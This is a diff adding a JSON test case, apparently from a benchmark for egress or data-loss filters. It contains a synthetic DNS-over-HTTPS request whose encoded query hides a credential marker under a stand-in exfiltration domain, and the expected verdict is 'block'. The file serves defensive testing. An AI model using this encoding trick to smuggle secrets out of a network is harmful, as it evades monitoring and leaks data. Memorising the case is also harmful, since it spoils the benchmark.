@@ -1,0 +1,22 @@
+{
+  "schema_version": 4,
+  "id": "url-doh-encoded-qname-020",
+  "category": "url",
+  "title": "Encoded credential marker in a DNS-over-HTTPS query",
+  "description": "An HTTPS GET to an approved fixture endpoint carries a DNS wire query whose name contains a base32-encoded credential marker. The endpoint stands in for an approved resolver; inspecting only the destination does not distinguish this request from an ordinary lookup.",
+  "input_type": "url",
+  "transport": "http_proxy",
+  "payload": {
+    "method": "GET",
+    "url": "https://allowed-code-api.test/dns-query?dns=AAABAAABAAAAAAAAIGlmZnVzcWtqajVqdW10MmVqemhkb3JreWlmZ3ZhdGNmAXgFZXhmaWwEdGVzdAAAAQAB",
+    "headers": {"Accept": "application/dns-message"}
+  },
+  "expected_verdict": "block",
+  "severity": "high",
+  "capability_tags": ["url_dlp", "encoding_evasion"],
+  "requires": ["tls_interception", "url_dlp_scanning"],
+  "false_positive_risk": "high",
+  "why_expected": "encoded_credential_marker_in_doh_query",
+  "notes": "The unpadded base64url dns parameter contains a DNS A query for a base32 marker under x.exfil.test. The benchmark-owned HTTPS fixture confirms delivery of the request, not completion of DNS resolution. The paired harmless query has the same method, endpoint, wire length, and encoding.",
+  "source": "Synthetic DNS-over-HTTPS GET request following RFC 8484 section 4.1.1"
+}
